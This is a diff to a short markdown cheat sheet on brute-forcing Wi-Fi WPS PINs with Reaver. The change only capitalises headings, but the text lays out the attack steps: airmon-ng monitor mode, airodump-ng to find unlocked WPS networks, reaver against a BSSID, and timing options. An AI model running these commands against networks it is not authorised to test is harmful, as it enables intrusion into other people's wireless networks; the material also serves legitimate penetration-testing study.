@@ -4,23 +4,23 @@
 Access Point will mostly block connection after to many requests
 ```
 
-### reaver needs the interface to be in monitor mode
+### Reaver needs the interface to be in monitor mode
 ```
 airmon-ng check kill
 airmon-ng start <interface>
 ```
 
-### all networks with WPS Lock options set to "no" can be attacked
+### All networks with WPS Lock options set to "no" can be attacked
 ```
 airodump-ng <interface> --wps
 ```
 
-### start brute force
+### Start brute force
 ```
 reaver -i <interface> -b <bssid> 
 ```
 
-### general information
+### General information
 ```
 default timeout value is 5 (minimum 1 second), change it with: -t <seconds>
 default delay period between pin attempts is 1 second, change it with: -d <seconds>
